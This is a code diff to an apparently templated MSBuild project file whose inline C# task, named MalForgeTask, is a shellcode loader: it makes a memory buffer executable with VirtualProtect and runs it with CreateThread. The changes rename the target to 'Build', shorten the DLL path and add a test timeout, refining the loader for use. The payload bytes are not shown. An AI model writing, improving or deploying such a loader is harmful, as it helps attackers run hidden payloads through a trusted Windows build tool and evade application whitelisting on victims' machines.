@@ -1,9 +1,9 @@
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <Target Name="{{ classname }}">
+  <Target Name="Build">
     <MalForgeTask/>
   </Target>
   <UsingTask TaskName="MalForgeTask" TaskFactory="CodeTaskFactory"
-    AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    AssemblyFile="Microsoft.Build.Tasks.v4.0.dll">
     <Task>
       <Reference Include="System.Security" />
       <Using Namespace="System" />
@@ -14,6 +14,7 @@ using System;
 using System.Runtime.InteropServices;
 {{ crypto_using }}
 using Microsoft.Build.Utilities;
+using Microsoft.Build.Framework;
 
 public class MalForgeTask : Task
 {
@@ -45,7 +46,7 @@ public class MalForgeTask : Task
         uint _vp;
         VirtualProtect(addr, (uint)buf.Length, 0x20, out _vp);
         IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-        WaitForSingleObject(hThread, 0xFFFFFFFF);
+        WaitForSingleObject(hThread, 5000); // 5s timeout for testing
         return true;
     }
 }
